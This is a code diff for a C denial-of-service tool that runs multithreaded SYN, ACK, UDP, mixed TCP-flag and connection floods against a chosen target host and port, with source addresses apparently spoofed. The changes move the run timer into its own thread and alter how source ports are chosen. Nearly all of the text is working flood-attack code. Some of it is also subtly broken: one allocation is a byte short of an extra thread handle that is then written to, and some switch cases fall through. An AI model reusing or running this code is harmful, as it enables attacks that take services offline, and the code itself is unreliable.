@@ -80,12 +80,12 @@ void *conn_flood_attack_thread(void *param)
     if(!leef_init(&leef, INJECTING))
         return NULL;
 
-    uint16_t src_port = leef_random_range(1025,65535);
+    uint16_t src_port = leef_random_src_port();
     uint16_t id;
     uint32_t seq;
 
-    while(running && (run_time <= 0 || leef_get_ticks() < run_time)) {
-        if(++src_port <= 1024)
+    while(running) {
+        if(++src_port >= 61000)
             src_port = 1025;
         id = leef_random_byte() << 8 | leef_random_byte();
         seq = action_uuid << 16 | id;
@@ -149,7 +149,7 @@ void conn_flood_sniff_thread()
             total_new_connections += new_connections;
             total_tx_bytes += tx_bytes;
 
-            if(!running || (run_time > 0 && ticksNow >= run_time))
+            if(!running)
                 break;
 
             if(!quiet) printf("SYN=%d/s SA=%d/s RA=%d/s FA=%d/s NEW=%d/s FAIL=%d/s ALIVE=%d TX=%.02f Kbps\n",
@@ -289,10 +289,8 @@ void interface_tx_thread()
     int64_t initialTxPackets = lastTxPackets;
     int64_t initialTxBytes = lastTxBytes;
 
-    while(1) {
+    while(running) {
         ticksNow = leef_get_ticks();
-        if(!running || (run_time > 0 && ticksNow >= run_time))
-            break;
         if(ticksNow - lastTicks >= 1000) {
             txPackets = leef_if_tx_packets(interface);
             txBytes = leef_if_tx_bytes(interface);
@@ -305,6 +303,7 @@ void interface_tx_thread()
             lastTxPackets = txPackets;
             lastTxBytes = txBytes;
         }
+        usleep(100 * 1000);
     }
 
     /* print stastistics */
@@ -321,10 +320,10 @@ void *syn_flood_attack_thread(void *param)
     if(!leef_init(&leef, INJECTING))
         return NULL;
 
-    while(running && (run_time == 0 || leef_get_ticks() < run_time)) {
+    while(running) {
         leef_send_tcp_syn(&leef,
                           get_src_ip(), dest_addr,
-                          leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
+                          leef_random_src_port(), dest_port == 0 ? leef_random_u16() : dest_port,
                           leef_random_u16(), leef_random_u32(),
                           use_tcp_options);
         if(sleep_interval)
@@ -332,7 +331,6 @@ void *syn_flood_attack_thread(void *param)
     }
 
     leef_terminate(&leef);
-    running = 0;
     return NULL;
 }
 
@@ -343,17 +341,16 @@ void *ack_flood_attack_thread(void *param)
     if(!leef_init(&leef, INJECTING))
         return NULL;
 
-    while(running && (run_time == 0 || leef_get_ticks() < run_time)) {
+    while(running) {
         leef_send_tcp_ack(&leef,
                           get_src_ip(), dest_addr,
-                          leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
+                          leef_random_src_port(), dest_port == 0 ? leef_random_u16() : dest_port,
                           leef_random_u16(), leef_random_u32(), leef_random_u32());
         if(sleep_interval)
             usleep(sleep_interval);
     }
 
     leef_terminate(&leef);
-    running = 0;
     return NULL;
 }
 
@@ -364,10 +361,10 @@ void *udp_flood_attack_thread(void *param)
     if(!leef_init(&leef, INJECTING))
         return NULL;
 
-    while(running && (run_time == 0 || leef_get_ticks() < run_time)) {
+    while(running) {
         leef_send_udp_data(&leef,
                            get_src_ip(), dest_addr,
-                           leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
+                           leef_random_src_port(), dest_port == 0 ? leef_random_u16() : dest_port,
                            leef_random_u16(),
                            send_data_size, get_send_data());
         if(sleep_interval)
@@ -375,7 +372,6 @@ void *udp_flood_attack_thread(void *param)
     }
 
     leef_terminate(&leef);
-    running = 0;
     return NULL;
 }
 
@@ -386,32 +382,32 @@ void *mix_flood_attack_thread(void *param)
     if(!leef_init(&leef, INJECTING))
         return NULL;
 
-    while(running && (run_time == 0 || leef_get_ticks() < run_time)) {
+    while(running) {
         switch(rand() % 4) {
             case 0: /* SYN */
                 leef_send_tcp_syn(&leef,
                                 get_src_ip(), dest_addr,
-                                leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
+                                leef_random_src_port(), dest_port == 0 ? leef_random_u16() : dest_port,
                                 leef_random_u16(), action_uuid << 16 | leef_random_u16(),
                                 use_tcp_options);
                 break;
             case 1: /* ACK */
                 leef_send_tcp_ack(&leef,
                                 get_src_ip(), dest_addr,
-                                leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
+                                leef_random_src_port(), dest_port == 0 ? leef_random_u16() : dest_port,
                                 leef_random_u16(), leef_random_u32(), leef_random_u32());
                 break;
             case 2: /* PUSH + ACK */
                 leef_send_raw_tcp2(&leef,
                                 get_src_ip(), dest_addr,
-                                leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
+                                leef_random_src_port(), dest_port == 0 ? leef_random_u16() : dest_port,
                                 leef_random_u16(), leef_random_u32(), leef_random_u32(),
                                 TCP_PUSH | TCP_ACK,
                                 send_data_size, get_send_data());
             case 3: /* FIN + ACK */
                 leef_send_raw_tcp2(&leef,
                                 get_src_ip(), dest_addr,
-                                leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
+                                leef_random_src_port(), dest_port == 0 ? leef_random_u16() : dest_port,
                                 leef_random_u16(), leef_random_u32(), leef_random_u32(),
                                 TCP_FIN | TCP_ACK,
                                 0, NULL);
@@ -422,7 +418,6 @@ void *mix_flood_attack_thread(void *param)
     }
 
     leef_terminate(&leef);
-    running = 0;
     return NULL;
 }
 
@@ -433,25 +428,25 @@ void *mix2_flood_attack_thread(void *param)
     if(!leef_init(&leef, INJECTING))
         return NULL;
 
-    while(running && (run_time == 0 || leef_get_ticks() < run_time)) {
+    while(running) {
         switch(rand() % 3) {
             case 0: /* ACK */
                 leef_send_tcp_ack(&leef,
                                 get_src_ip(), dest_addr,
-                                leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
+                                leef_random_src_port(), dest_port == 0 ? leef_random_u16() : dest_port,
                                 leef_random_u16(), leef_random_u32(), leef_random_u32());
                 break;
             case 1: /* PUSH + ACK */
                 leef_send_raw_tcp2(&leef,
                                 get_src_ip(), dest_addr,
-                                leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
+                                leef_random_src_port(), dest_port == 0 ? leef_random_u16() : dest_port,
                                 leef_random_u16(), leef_random_u32(), leef_random_u32(),
                                 TCP_PUSH | TCP_ACK,
                                 send_data_size, get_send_data());
             case 2: /* FIN + ACK */
                 leef_send_raw_tcp2(&leef,
                                 get_src_ip(), dest_addr,
-                                leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
+                                leef_random_src_port(), dest_port == 0 ? leef_random_u16() : dest_port,
                                 leef_random_u16(), leef_random_u32(), leef_random_u32(),
                                 TCP_FIN | TCP_ACK,
                                 0, NULL);
@@ -462,7 +457,6 @@ void *mix2_flood_attack_thread(void *param)
     }
 
     leef_terminate(&leef);
-    running = 0;
     return NULL;
 }
 
@@ -473,17 +467,16 @@ void *pa_flood_attack_thread(void *param)
     if(!leef_init(&leef, INJECTING))
         return NULL;
 
-    while(running && (run_time == 0 || leef_get_ticks() < run_time)) {
+    while(running) {
         leef_send_raw_tcp2(&leef,
                         get_src_ip(), dest_addr,
-                        leef_random_range(1025,65535), dest_port == 0 ? leef_random_u16() : dest_port,
+                        leef_random_src_port(), dest_port == 0 ? leef_random_u16() : dest_port,
                         leef_random_u16(), leef_random_u32(), leef_random_u32(),
                         TCP_PUSH | TCP_ACK,
                         send_data_size, get_send_data());
     }
 
     leef_terminate(&leef);
-    running = 0;
     return NULL;
 }
 
@@ -496,7 +489,7 @@ void tcp_ping_thread()
     leef_set_sniff_packet_size(&leef, 128);
 
     leef_sniffed_packet packet;
-    uint16_t src_port = leef_random_range(1025,65535);
+    uint16_t src_port = leef_random_src_port();
     uint32_t ping_ports[65536];
     uint32_t lastTicks;
     uint32_t ticksNow;
@@ -513,7 +506,7 @@ void tcp_ping_thread()
 
     while(1) {
         ticksNow = leef_get_ticks();
-        if((!running  || (run_time > 0 && ticksNow >= run_time)) && !stopping) {
+        if(!running && !stopping) {
             stopping = 1;
             lastTicks = ticksNow;
         }
@@ -522,10 +515,10 @@ void tcp_ping_thread()
         if(!stopping && ticksNow - lastTicks >= 1000) {
             lastTicks = ticksNow;
 
-            /* send a SYN ping */
-            if(++src_port <= 1024)
-                src_port = 1025;
+            if(++src_port >= 61000)
+                src_port = 32769;
 
+            /* send a SYN ping */
             leef_send_tcp_syn(&leef,
                               interface_addr, dest_addr,
                               src_port, dest_port,
@@ -582,6 +575,17 @@ void tcp_ping_thread()
     }
 
     leef_terminate(&leef);
+}
+
+void *run_timer_thread(void *param)
+{
+    int i=0;
+    if(run_time > 0) {
+        for(i=0;i<run_time;++i)
+            usleep(1000*1000);
+        running = 0;
+    }
+    return NULL;
 }
 
 void print_help(char **argv)
@@ -684,7 +688,7 @@ int main(int argc, char **argv)
                     break;
                 case 'm':
                     num_threads = atoi(argv[++arg]);
-                    if(num_threads == 0) {
+                    if(num_threads < 1) {
                         fprintf(stderr, "use at least 1 thread\n");
                         return -1;
                     }
@@ -746,7 +750,7 @@ int main(int argc, char **argv)
                     break;
                 }
                 case 't':
-                    run_time = (uint32_t)(atoi(argv[++arg]))*1000;
+                    run_time = (uint32_t)(atoi(argv[++arg]));
                     break;
                 case 'd': {
                     FILE *fp = fopen(argv[++arg], "rb");
@@ -784,6 +788,11 @@ int main(int argc, char **argv)
         }
     }
 
+    if(send_data_size > 1460) {
+        fprintf(stderr, "send data must be not greater than 1460\n");
+        return -1;
+    }
+
     if(dest_addr == 0) {
         fprintf(stderr, "please specify a target host, see --help\n");
         return -1;
@@ -794,13 +803,14 @@ int main(int argc, char **argv)
         return -1;
     }
 
-    pthread_t *threads = (pthread_t *)malloc(sizeof(pthread_t) * num_threads);
-    int i;
+    pthread_t *threads = (pthread_t *)malloc((sizeof(pthread_t) * num_threads) + 1);
+    pthread_create(&threads[num_threads], NULL, run_timer_thread, NULL);
 
     /* force first tick */
     leef_get_ticks();
 
     /* run the action */
+    int i;
     switch(action) {
         case TCP_PING:
             if(dest_port == 0) {
@@ -820,7 +830,7 @@ int main(int argc, char **argv)
             if(!quiet) printf("CONNECTION FLOOD %s:%d\n", hostname, dest_port);
             for(i=0; i < num_threads; ++i)
                 pthread_create(&threads[i], NULL, conn_flood_attack_thread, NULL);
-            conn_flood_sniff_thread();
+            interface_tx_thread();
             break;
         case SYN_FLOOD:
             if(!quiet) printf("SYN FLOOD %s:%d\n", hostname, dest_port);
@@ -860,7 +870,7 @@ int main(int argc, char **argv)
     }
 
     /* wait threads */
-    for(i=0;i<num_threads;++i)
+    for(i=0;i<num_threads+1;++i)
         pthread_join(threads[i], NULL);
 
     /* cleanup */
